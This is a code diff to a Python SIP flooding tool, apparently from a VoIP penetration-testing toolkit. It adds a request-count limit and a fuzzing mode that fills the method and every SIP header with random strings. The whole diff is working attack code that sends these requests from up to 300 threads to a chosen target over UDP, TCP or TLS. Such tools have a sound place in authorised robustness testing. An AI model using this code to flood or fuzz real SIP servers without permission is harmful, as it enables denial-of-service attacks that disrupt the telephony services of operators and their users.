@@ -16,7 +16,7 @@ import ssl
 import fcntl
 import threading
 import time
-from lib.functions import create_message, get_free_port
+from lib.functions import create_message, get_free_port, generate_random_integer, generate_random_string
 
 BRED = '\033[1;31;40m'
 RED = '\033[0;31;40m'
@@ -58,13 +58,24 @@ class SipFlood:
         self.verbose = '0'
         self.nthreads = '300'
         self.count = 0
+        self.number = 999999
+        self.bad = '0'
+        self.supported_methods = []
+
+        self.alphabet = 'printable'
+        self.min = 0
+        self.max = 1000
 
         self.run = True
 
     def start(self):
         supported_protos = ['UDP', 'TCP', 'TLS']
-        supported_methods = ['REGISTER', 'SUBSCRIBE', 'NOTIFY', 'PUBLISH', 'MESSAGE', 'INVITE',
+        self.supported_methods = ['REGISTER', 'SUBSCRIBE', 'NOTIFY', 'PUBLISH', 'MESSAGE', 'INVITE',
                              'OPTIONS', 'ACK', 'CANCEL', 'BYE', 'PRACK', 'INFO', 'REFER', 'UPDATE']
+
+        if self.bad == 1:
+            self.supported_methods.append('FUZZ')
+
 
         self.method = self.method.upper()
         self.proto = self.proto.upper()
@@ -77,7 +88,7 @@ class SipFlood:
             self.verbose = '0'
 
         # check method
-        if self.method not in supported_methods:
+        if self.bad == None and self.method not in self.supported_methods:
             print(BRED + 'Method %s is not supported' % self.method)
             sys.exit()
 
@@ -98,6 +109,12 @@ class SipFlood:
              GREEN + '%d' % self.nthreads)
         if self.nthreads > 300:
             print(BRED + '[x] More than 300 threads can cause socket problems')
+        print(BWHITE + '[!] Number of requests: ' + GREEN + '%s' % self.number)
+        
+        if self.bad == 1:
+            print(BWHITE + '[!] Alphabet: ' + GREEN + '%s' % self.alphabet)
+            print(BWHITE + '[!] Min length: ' + GREEN + '%d' % self.min)
+            print(BWHITE + '[!] Max length: ' + GREEN + '%d' % self.max)
         print(WHITE)
 
         threads = list()
@@ -111,6 +128,8 @@ class SipFlood:
         for i, t in enumerate(threads):
             t.join()
  
+        print(WHITE)
+
     def signal_handler(self, sig, frame):
         self.stop()
         time.sleep(0.1)
@@ -141,20 +160,23 @@ class SipFlood:
 
             host = (str(self.ip), int(self.rport))
 
-            if self.host != '' and self.domain == '':
-                self.domain = self.host
-            if self.domain == '':
-                self.domain = self.ip
-            if not self.from_domain or self.from_domain == '':
-                self.from_domain = self.domain
-            if not self.to_domain or self.to_domain == '':
-                self.to_domain = self.domain
+            if self.bad == None:
+                if self.host != '' and self.domain == '':
+                    self.domain = self.host
+                if self.domain == '':
+                    self.domain = self.ip
+                if not self.from_domain or self.from_domain == '':
+                    self.from_domain = self.domain
+                if not self.to_domain or self.to_domain == '':
+                    self.to_domain = self.domain
 
-            if self.contact_domain == '':
-                self.contact_domain = '10.0.0.1'
+                if self.contact_domain == '':
+                    self.contact_domain = '10.0.0.1'
 
-            msg = create_message(self.method, self.contact_domain, self.from_user, self.from_name, self.from_domain,
-                                self.to_user, self.to_name, self.to_domain, self.proto, self.domain, self.user_agent, lport, '', '', '', '1', '', self.digest, 1, '', 0, '', '')
+                msg = create_message(self.method, self.contact_domain, self.from_user, self.from_name, self.from_domain,
+                                    self.to_user, self.to_name, self.to_domain, self.proto, self.domain, self.user_agent, lport, '', '', '', '1', '', self.digest, 1, '', 0, '', '')
+
+                method_label = self.method
 
             try:
                 sock.settimeout(1)
@@ -170,25 +192,61 @@ class SipFlood:
                 print('Socket connection error')
                 exit()
 
-            while self.run == True:
+            while(self.run == True and self.count <= self.number):
                 try:
+                    if self.bad == 1:
+                        if not self.method or self.method == '':
+                            method = (self.supported_methods[generate_random_integer(0, 13)])
+                            if method == 'FUZZ':
+                                method = generate_random_string(self.min, self.max, self.alphabet)
+                        else:
+                                method = self.method
+                        
+                        method_label = method
+                        
+                        contactdomain = generate_random_string(self.min, self.max, self.alphabet)
+                        fromuser = generate_random_string(self.min, self.max, self.alphabet)
+                        fromname = generate_random_string(self.min, self.max, self.alphabet)
+                        fromdomain = generate_random_string(self.min, self.max, self.alphabet)
+                        touser = generate_random_string(self.min, self.max, self.alphabet)
+                        toname = generate_random_string(self.min, self.max, self.alphabet)
+                        todomain = generate_random_string(self.min, self.max, self.alphabet)
+                        proto = generate_random_string(self.min, self.max, self.alphabet)
+                        domain = generate_random_string(self.min, self.max, self.alphabet)
+                        useragent = generate_random_string(self.min, self.max, self.alphabet)
+                        fromport = generate_random_integer(self.min, self.max)
+                        branch = generate_random_string(self.min, self.max, self.alphabet)
+                        callid = generate_random_string(self.min, self.max, self.alphabet)
+                        tag = generate_random_string(self.min, self.max, self.alphabet)
+                        cseq = generate_random_string(self.min, self.max, self.alphabet)
+                        totag = generate_random_string(self.min, self.max, self.alphabet)
+                        digest = generate_random_string(self.min, self.max, self.alphabet)
+                        auth_type = generate_random_integer(1, 2)
+                        referto = generate_random_string(self.min, self.max, self.alphabet)
+                        withsdp = generate_random_integer(1, 2)
+                        via = generate_random_string(self.min, self.max, self.alphabet)
+                        rr = generate_random_string(self.min, self.max, self.alphabet)
+
+                        msg = create_message(method, contactdomain, fromuser, fromname, fromdomain, touser, toname, todomain, proto, domain, useragent, fromport, branch, callid, tag, cseq, totag, digest, auth_type, referto, withsdp, via, rr)
+
+                    if self.verbose == 2:
+                        print(BWHITE + '[+] Sending %s to %s:%s ...' %
+                            (method_label, self.ip, self.rport))
+                        print(YELLOW + msg)
+                    elif self.verbose == 1:
+                        print(BWHITE + '[%s] Sending %s to %s:%s/%s ...' % (str(self.count),
+                            method_label, self.ip, self.rport, self.proto)+ " ".ljust(100), end="\r")
+
                     if self.proto == 'TLS':
                         sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
                     else:
                         sock.sendto(bytes(msg[:8192], 'utf-8'), host)
 
-                    if self.verbose == 2:
-                        print(BWHITE + '[+] Sending to %s:%s ...' %
-                            (self.ip, self.rport))
-                        print(YELLOW + msg)
-                    elif self.verbose == 1:
-                        print(BWHITE + '[%s] Sending %s to %s:%s/%s ...' % (str(self.count),
-                            self.method.upper(), self.ip, self.rport, self.proto), end="\r")
-                        self.count += 1
-
                 except socket.timeout:
                     pass
                 except:
                     pass
+
+                self.count += 1
         except:
             pass
